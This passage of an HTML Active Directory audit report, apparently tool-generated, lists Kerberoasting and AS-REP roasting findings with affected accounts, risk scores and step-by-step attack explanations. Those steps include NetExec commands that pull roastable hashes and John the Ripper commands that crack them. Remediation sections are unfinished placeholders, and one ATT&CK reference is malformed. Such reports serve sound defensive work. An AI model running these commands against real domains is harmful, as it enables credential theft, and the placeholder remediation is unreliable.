                                    <p>This means for 2 users with an SPN set, it is possible to retrieve the user's hashed password that can be cracked if the password is weak to obtain the user's plaintext password. Even if the password is strong, it is still theoretically possible for a determined threat actor with unlimited time and computational power to crack the hash, however the risk is lower.</p>
                                    <p class="links"><b>Further information:</b></p>
                                    <p><a href="https://attack.mitre.org/techniques/T1558/003/>">Link 1</a></p>
                                    <p><a href="https://www.netwrix.com/cracking_kerberos_tgs_tickets_using_kerberoasting.html">Link 2</a></p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Attack explanation</th>
                            </tr>
                            <tr>
                                <td>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>1. Any low-privileged user can search for accounts with an SPN set.</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/Kerberoasting-1.png" alt="Finding Kerberoastable accounts">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>2. Any low-privileged user can request a TGS for the service and extract the password hash from the TGS for the service account.</p>
                                            <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' --kerberoasting output.txt</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/Kerberoasting-2.png"
                                                alt="Obtaining the hash">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>3. If the password is weak the password hash can be cracked using a common wordlist to obtain the plaintext password, or is can be bruteforced using a powerful GPU.</p>
                                            <p class="code">john --format=krb5tgs --wordlist=./password-list.txt hash.txt</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/Kerberoasting-3.png"
                                                alt="Cracking the hash">
                                        </span>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Remediation (GPT to contextualize)</th>
                            </tr>
                            <tr>
                                <td>
                                    <p>Remove the SPN / move to low privileged account / gMSA.</p>
                                    <p>run command 1</p>
                                    <p>run command 2</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </td>
        </tr>                <tr>
            <td class="toggle" id="Low-privileged-ASREP-roastable-user-with-a-weak-password"><u>Low privileged ASREP-roastable user with a weak password</u></td>
            <td class="finding-riskHIGH">HIGH</td>
        </tr>
        <tr class="finding">
            <td colspan="3">
                <div class="finding-info">
                    <table>
                        <tbody>
                            <tr>
                                <th>Issue</th>
                                <th>MITRE ATT&CK ref</th>
                                <th>Score</th>
                            </tr>
                            <tr><td>Password hash of a low privileged account can be obtained and cracked.</td>                                        <td>T-15940</td>
                                <td>+25</td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Relevant info</th>
                                <th>Issue explanation</th>
                            </tr>
                            <tr>
                                <td class="relevantinfo"><table>
                                    <tr><td class="grey">Users</td><td>bob
LILLY_ABBOTT
MARIA_NOBLE
MABEL_KENNEDY
PAULA_SNOW
JUANA_HORNE
HILARY_KIRK
MEREDITH_NOEL</td></tr>                                        <tr><td class="grey">Enabled</td><td>True</td></tr>
                                <tr><td class="grey">DoNotRequireKerberosPreauthentication</td><td>True</td></tr>
                                </table></td>
                                <td class="explanation">
                                    <p>ASREP-roasting is a vulnerability where a user has the "Do not requrire Kerberos preauthentication" flag set within Active Directory. This means that when requesting a TGT from the KDC, the entire validation process of needing to present a timestamp encrypted with the users hashed password to validate that user is authorized to request the TGT is skipped. Therefore without even knowing the users password, it is possible to retrieve an encrypted TGT for the user in an AS-REP message.</p>
                                    <p>This means for 8 users it is possible to retrieve the user's hashed password and attempt to crack it if the password is weak to obtain the user's plaintext password. Even if the password is strong, it is still theoretically possible for a determined threat actor with unlimited time and computational power to crack the hash, however the risk is lower.</p>
                                    <p class="links"><b>Further information:</b></p>
                                    <p><a href="https://trustmarque.com/resources/asreproasting/>">Link 1</a></p>
                                    <p><a href="https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/">Link 2</a></p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Attack explanation</th>
                            </tr>
                            <tr>
                                <td>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>1. Any low-privileged user can search for accounts that have the "Do not require Kerberos preauthentication" flag set within the directory.</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/ASREProast-1.png" alt="Finding ASREP-roastable accounts">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>2. Any low-privileged user can request an encrypted TGT for the user not requirng kerberos preauthenticaiton and obtain the password hash for the user.</p>
                                            <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' --asreproast output.txt</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/ASREProast-2.png"
                                                alt="Obtaining the hash">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>3. If the password is weak the password hash can be cracked using a common wordlist to obtain the plaintext password, or is can be bruteforced using a powerful GPU.</p>
                                            <p class="code">john --wordlist=./password-list.txt hash.txt</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/ASREProast-3.png"
                                                alt="Cracking the hash">
                                        </span>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Remediation (GPT to contextualize)</th>
                            </tr>
                            <tr>
                                <td>
                                    <p>Remove the do not require pre auth flag for X,Y,Z users - there is no use case for this.</p>
                                    <p>run command 1</p>
                                    <p>run command 2</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </td>
        </tr>                <tr>
            <td class="toggle" id="Disabled-ASREP-roastable-user"><u>Disabled ASREP-roastable user</u></td>
            <td class="finding-riskLOW">LOW</td>
        </tr>
        <tr class="finding">
            <td colspan="3">
                <div class="finding-info">
                    <table>
                        <tbody>
                            <tr>
                                <th>Issue</th>
                                <th>MITRE ATT&CK ref</th>
                                <th>Score</th>
                            </tr>
                            <tr><td>Password hash of a disabled account can be obtained and cracked.</td>                                        <td>T-15940</td>
                                <td>+9</td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Relevant info</th>
                                <th>Issue explanation</th>
                            </tr>
                            <tr>
                                <td class="relevantinfo"><table>
                                    <tr><td class="grey">Users</td><td>test2
MILO_ADAMS</td></tr>                                        <tr><td class="grey">Enabled</td><td>False</td></tr>
                                <tr><td class="grey">DoNotRequireKerberosPreauthentication</td><td>True</td></tr>
                                </table></td>
                                <td class="explanation">
                                    <p>ASREP-roasting is a vulnerability where a user has the "Do not requrire Kerberos preauthentication" flag set within Active Directory. This means that when requesting a TGT from the KDC, the entire validation process of needing to present a timestamp encrypted with the users hashed password to validate that user is authorized to request the TGT is skipped. Therefore without even knowing the users password, it is possible to retrieve an encrypted TGT for the user in an AS-REP message.</p>
                                    <p>This means for 2 users it is possible to retrieve the user's hashed password and attempt to crack it if the password is weak to obtain the user's plaintext password. Even if the password is strong, it is still theoretically possible for a determined threat actor with unlimited time and computational power to crack the hash, however the risk is lower.</p>
                                    <p class="links"><b>Further information:</b></p>
                                    <p><a href="https://trustmarque.com/resources/asreproasting/>">Link 1</a></p>
                                    <p><a href="https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/">Link 2</a></p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Attack explanation</th>
                            </tr>
                            <tr>
                                <td>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>1. Any low-privileged user can search for accounts that have the "Do not require Kerberos preauthentication" flag set within the directory.</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/ASREProast-1.png" alt="Finding ASREP-roastable accounts">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>2. Any low-privileged user can request an encrypted TGT for the user not requirng kerberos preauthenticaiton and obtain the password hash for the user.</p>
                                            <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' --asreproast output.txt</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/ASREProast-2.png"
                                                alt="Obtaining the hash">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>3. If the password is weak the password hash can be cracked using a common wordlist to obtain the plaintext password, or is can be bruteforced using a powerful GPU.</p>
                                            <p class="code">john --wordlist=./password-list.txt hash.txt</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/ASREProast-3.png"
                                                alt="Cracking the hash">
                                        </span>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Remediation (GPT to contextualize)</th>
                            </tr>
                            <tr>
                                <td>
                                    <p>Remove the do not require pre auth flag for X,Y,Z users - there is no use case for this.</p>
                                    <p>run command 1</p>
                                    <p>run command 2</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </td>
        </tr>                <tr>
            <td class="toggle" id="Disabled-Kerberoastable-account"><u>Disabled Kerberoastable account</u></td>
            <td class="finding-riskLOW">LOW</td>
        </tr>
        <tr class="finding">
            <td colspan="3">
                <div class="finding-info">
                    <table>
                        <tbody>
                            <tr>
                                <th>Issue</th>
                                <th>MITRE ATT&CK ref</th>
                                <th>Score</th>
                            </tr>
                            <tr>                                        <td>T1558.003</td>
                                <td>+9</td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Relevant info</th>
                                <th>Issue explanation</th>
                            </tr>
                            <tr>
                                <td class="relevantinfo"><table>
                                    <tr><td class="grey">Users</td><td>kerberoast-disabled
HELENE_PARSONS</td></tr>
                                    <tr><td class="grey">SPN</td><td>a/HOST
CIFS/test</td></tr>                                        <tr><td class="grey">Enabled</td><td>False</td></tr>
                                </table></td>
                                <td class="explanation">
                                    <p>Kerberoasting-roasting is a vulnerability where an account has a Service Principal Name (SPN) set and a weak password within Active Directory. In Microsoft Windows, SPNs are simply unique identifiers of service accounts. By design, to access the service run by the account, domain users request tickets (TGS) for that service using Kerberos which are encrypted with the service accounts NTLM hash. This is possible by any domain user, regardless if they have permission to access the service or not. The TGS is encrypted with a hashed vesion of the account's password, which can be retrieved from the TGS./p>
                                    <p>This means for 2 users with an SPN set, it is possible to retrieve the user's hashed password that can be cracked if the password is weak to obtain the user's plaintext password. Even if the password is strong, it is still theoretically possible for a determined threat actor with unlimited time and computational power to crack the hash, however the risk is lower.</p>
                                    <p class="links"><b>Further information:</b></p>
                                    <p><a href="https://attack.mitre.org/techniques/T1558/003/>">Link 1</a></p>
                                    <p><a href="https://www.netwrix.com/cracking_kerberos_tgs_tickets_using_kerberoasting.html">Link 2</a></p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Attack explanation</th>
                            </tr>
                            <tr>
                                <td>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>1. Any low-privileged user can search for accounts with an SPN set.</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/Kerberoasting-1.png" alt="Finding Kerberoastable accounts">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>2. Any low-privileged user can request a TGS for the service and extract the password hash from the TGS for the service account.</p>
                                            <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' --kerberoasting output.txt</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/Kerberoasting-2.png"
                                                alt="Obtaining the hash">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>3. If the password is weak the password hash can be cracked using a common wordlist to obtain the plaintext password, or is can be bruteforced using a powerful GPU.</p>
                                            <p class="code">john --format=krb5tgs --wordlist=./password-list.txt hash.txt</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/Kerberoasting-3.png"
                                                alt="Cracking the hash">
                                        </span>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Remediation (GPT to contextualize)</th>
                            </tr>
                            <tr>
                                <td>
                                    <p>Remove the SPN / move to low privileged account / gMSA.</p>
                                    <p>run command 1</p>
                                    <p>run command 2</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </td>
        </tr></tbody></table></div>


                                                    <!-- js to drop down each finding-->
                                                    <script>
                                                        // Get all the rows with class "toggle"
                                                        var toggles = document.querySelectorAll('.toggle');

                                                        // Add event listener to each toggle row
                                                        toggles.forEach(function (toggle) {
                                                            toggle.addEventListener('click', function () {
                                                                // Toggle the visibility of the next sibling element with class "finding"
                                                                var finding = this.parentNode.nextElementSibling;
                                                                finding.style.display = (finding.style.display === 'table-row') ? 'none' : 'table-row';
                                                            });
                                                        });
                                                    </script>
</body>

</html>